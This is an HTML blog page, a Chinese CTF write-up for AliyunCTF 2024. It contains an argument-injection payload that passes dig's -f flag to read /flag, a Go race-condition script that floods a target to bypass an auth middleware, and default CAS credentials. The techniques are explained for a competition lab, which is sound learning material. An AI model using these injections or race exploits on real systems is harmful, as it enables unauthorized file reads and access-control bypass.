@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="kinoko">
+
+
+
+
+    <meta name="keywords" content="博客,blog,阿菇,阿菇kinoko,kinoko,usamikinoko">
+
+
+<title>AliyunCTF2024 Writeup | 阿菇的博客</title>
+
+
+
+    <link rel="icon" href="/favicon.jpg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Kinoko&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Kinoko&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">AliyunCTF2024 Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">kinoko</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 21, 2024&nbsp;&nbsp;0:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Security/">Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="writeup-ctf"><a href="#writeup-ctf" class="headerlink" title="writeup.ctf"></a>writeup.ctf</h2><h3 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h3><p>命令注入题目，发 POST 请求时添加 <code>-f</code> 参数就能读取 <code>/flag</code>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;-f/flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Pastbin"><a href="#Pastbin" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>出题人基于 go1.22 原生库手搓了简易 Web 框架，但这个框架在实现路由时共用了一个底层 slice，导致 <code>c.mws</code> 可以被其他 goroutine 污染，也就是在 append 时实现数据竞争。</p>
+<blockquote>
+<p>之前对 Golang 的关注点一直在怎么用来写服务上，对于框架本身研究很渣，做题的时候也是在找有没有一些逻辑漏洞，盯着中间件这些瞎看，没什么成果。后来 Baimeow 上线看 Router 部分找到了这个公用 slice，搓了个脚本打出来了 flag.</p>
+</blockquote>
+<p>刚开始在源码里看到下面这段代码，想着是不是要选手去打 JWT，讨论之后发现走不通。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// No matter what the password is, you can not log in as admin</span></span><br><span class="line"><span class="comment">//// I think</span></span><br></pre></td></tr></table></figure>
+
+<p>服务里有个鉴权中间件 <code>secureFlagMiddleware</code>，当用户访问 <code>/flag</code> 时会检查请求 token 里是否有 admin，如果没有会删掉返回值中的 flag 字段。然后在框架的 <code>Handle()</code> 函数中，可以发现这里有一个 <code>append</code> 操作，而 <code>c.mws</code> 在底层是被所有路由共用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// mws=&#123;[]func(http.Handler) http.Handler&#125;</span><br><span class="line"></span><br><span class="line">func (rtr *Router) Handle(method string, pattern string, handlers []Handler) &#123;</span><br><span class="line">    rtr.handle(method, pattern, func(resp http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">       c := rtr.m.createContext(resp, req)</span><br><span class="line">       for _, h := range handlers &#123;</span><br><span class="line">          c.mws = append(c.mws, getMWFromHandler(h))</span><br><span class="line">       &#125;</span><br><span class="line">       c.run()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这块再结合鉴权用中间件，思路就出来了：我们可以构造三个请求，让第一个非 <code>/flag</code> 请求的后两个 Handler 被第二个 <code>/flag</code> 请求覆盖，再发第三个请求覆盖 <code>/flag</code> 的第一个 Handler 取消 adminOnly 的限制，这样就能实现绕过 <code>secureFlagMiddleware</code> 获取 flag。</p>
+<p>之后 Baimeow 搓了个脚本：</p>
+<blockquote>
+<p>“触发条件比较苛刻，脚本有点讲究的，必须让最大量的流量在路由部分，且保持两类流量比例”</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var url = &quot;TARGET_IP&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    limiter1 := make(chan struct&#123;&#125;, 64)</span><br><span class="line">    limiter2 := make(chan struct&#123;&#125;, 32)</span><br><span class="line">    go func() &#123;</span><br><span class="line">       for &#123;</span><br><span class="line">          limiter1 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendSlash() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">          &lt;-limiter1</span><br><span class="line">          limiter1 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendSlash() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">          &lt;-limiter1</span><br><span class="line">          &lt;-limiter2</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    var i = 0</span><br><span class="line">    go func() &#123;</span><br><span class="line">       for &#123;</span><br><span class="line">          limiter2 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          i++</span><br><span class="line">          fmt.Println(&quot;try&quot;, i)</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendFlag() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    select &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func SendSlash() bool &#123;</span><br><span class="line">    get, err := http.Get(url + &quot;/&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">       log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    if get != nil &#123;</span><br><span class="line">       defer get.Body.Close()</span><br><span class="line">       return checkBody(get.Body)</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func SendFlag() bool &#123;</span><br><span class="line">    get, err := http.Get(url + &quot;/flag&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">       log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    if get != nil &#123;</span><br><span class="line">       defer get.Body.Close()</span><br><span class="line">       return checkBody(get.Body)</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkBody(rd io.Reader) bool &#123;</span><br><span class="line">    data, _ := io.ReadAll(rd)</span><br><span class="line">    if data == nil &#123;</span><br><span class="line">       return false</span><br><span class="line">    &#125;</span><br><span class="line">    if strings.Contains(string(data), &quot;aliyunctf&#123;&quot;) &#123;</span><br><span class="line">       fmt.Println(string(data))</span><br><span class="line">       return true</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以关注下脚本中高亮的部分，是基于 channel 实现的限流器，如上文所说将 <code>/</code> 和 <code>/flag</code> 的请求比例控制在 2:1。</p>
+<p>:::info 具体是如何控制不同请求比例的呢？</p>
+<p><code>limiter1</code> 和 <code>limiter2</code> 是两个无缓冲的通道，它们的容量分别为 64 和 32。这意味着这两个通道最多可以同时容纳 64 和 32 个空结构体。</p>
+<p>当一个 goroutine 尝试向一个已满的通道发送数据时，这个 goroutine 会被阻塞，直到有其他 goroutine 从该通道接收数据，使得通道有足够的空间来存放新的数据。</p>
+<p>同样，当一个 goroutine 尝试从一个空的通道接收数据时，这个 goroutine 也会被阻塞，直到有其他 goroutine 向该通道发送数据。</p>
+<p>因此，这两个通道就像是两个限流器，它们限制了同时运行的 <code>SendSlash()</code> 和 <code>SendFlag()</code> 的数量。当这两个函数的数量达到通道的容量时，新的函数调用会被阻塞，直到有正在运行的函数完成。</p>
+<p>:::</p>
+<h3 id="easyCAS"><a href="#easyCAS" class="headerlink" title="easyCAS"></a>easyCAS</h3><blockquote>
+<p>怎么网上都是 4.X 的漏洞，版本 5.X 没漏洞了吗，可是都是六年前的了，真的没问题吗，不管了，那我就搭起来看看吧，反正没漏洞密码也懒得改了。嗷~对了，还要调一下代码，开一下调试功能。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/apereo/cas">CAS 项目地址</a>，题目环境对应版本源码：<a target="_blank" rel="noopener" href="https://github.com/apereo/cas-overlay-template/tree/5.3">release 5.3.16</a>，可以在本地起环境。</p>
+<p>有了源码之后可以在配置文件中遭到默认用户密码，直接可以登进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./gradlew duct</span><br><span class="line">    -Pduct.cas.1=https://node1.example.org/cas \</span><br><span class="line">    -Pduct.cas.2=https://node2.example.org/cas \</span><br><span class="line">    -Pduct.cas.3=https://node3.example.org/cas \</span><br><span class="line">    -Pduct.cas.4=https://node4.example.org/cas \</span><br><span class="line">    -Pduct.service=https://apereo.github.io \</span><br><span class="line">    -Pduct.username=casuser \</span><br><span class="line">    -Pduct.password=Mellon</span><br></pre></td></tr></table></figure>
+
+<p>:::danger</p>
+<p>Working in progress…</p>
+<p>:::</p>
+<h2 id="About-ctf"><a href="#About-ctf" class="headerlink" title="About.ctf"></a>About.ctf</h2><h3 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web 签到"></a>Web 签到</h3><p>搞过 Web 开发的肯定都了解 CDN。全称 Content Delivery Network，即内容分发网络，这种技术通过在全球多个地点部署服务器节点来优化内容的交付。这些节点缓存网页静态资源，使得用户可以从地理上更接近自己的位置获取这些内容，从而减少延迟，提高加载速度和用户体验。</p>
+<p>:::tip CDN的工作原理</p>
+<p>当用户请求特定的内容时，CDN 的 DNS 系统会将请求重定向到最近的服务器节点。这个节点会提供请求的内容，如果该节点没有缓存该内容，它会从源服务器或其他节点获取内容，然后提供给用户。这个过程减少了数据传输的距离，提高了速度和效率。</p>
+<p>:::</p>
+<p>在处理 CDN 时，我们就常用 <code>dig</code>，因为它可以帮助我们验证 CDN 的 DNS 配置和性能。</p>
+<p><code>dig</code> 本质上是个 DNS 查询工具，并不是为了 CDN 技术而开发，但它确实能帮开发者们获取 CDN 相关信息，比如查询 CDN 缓存状态、检测性能以及排查问题。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [server] [name] [type]</span><br></pre></td></tr></table></figure>
+
+<p>最简单的使用就是后面跟 domain，这里以该站点域名为例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dig ma5hr00m.top</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--------------</span></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; ma5hr00m.top</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24018</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;ma5hr00m.top.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">ma5hr00m.top.           600     IN      A       123.206.118.236</span><br><span class="line"></span><br><span class="line">;; Query time: 252 msec</span><br><span class="line">;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)</span><br><span class="line">;; WHEN: Tue May 07 20:40:39 CST 2024</span><br><span class="line">;; MSG SIZE  rcvd: 5</span><br></pre></td></tr></table></figure>
+
+<p>其他细致用法去看 help 文档。这道题目里是利用了 <code>-f</code> 参数，当 dig 使用该参数时，可以从指定文件中读取 domain 列表并逐个查询，利用这个参数就能读取指定文件内容。</p>
+<h3 id="Pastbin-1"><a href="#Pastbin-1" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>Pastebin 是一种常见的在线内容托管服务，它允许用户在网站上存储（粘贴）纯文本，如代码片段，并生成一个网址。打开这个网址就可以看到对应的文字。这个服务通常用于快速共享文本或代码片段，尤其是在开发社区中非常流行。用户可以选择文本的类型（例如代码所属的编程语言）、保存时间（如 1 天、7 天、30 天或阅后即销毁等）以及分享者的昵称等信息。</p>
+<blockquote>
+<p>说实话没用过，感觉这个需求直接被开发文档给吃掉了，没什么必要搞这种服务。</p>
+</blockquote>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>kinoko</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2024/04/21/2024/aliyunctf-2024/">http://example.com/2024/04/21/2024/aliyunctf-2024/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/05/21/2024/hello-web/">HelloWeb 致新生</a>
+            
+            
+            <a class="next" rel="next" href="/2024/02/19/2024/overview-of-nginx-process-model/">Nginx进程模型概述</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© kinoko 2022-2025. All rights reserved.</span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
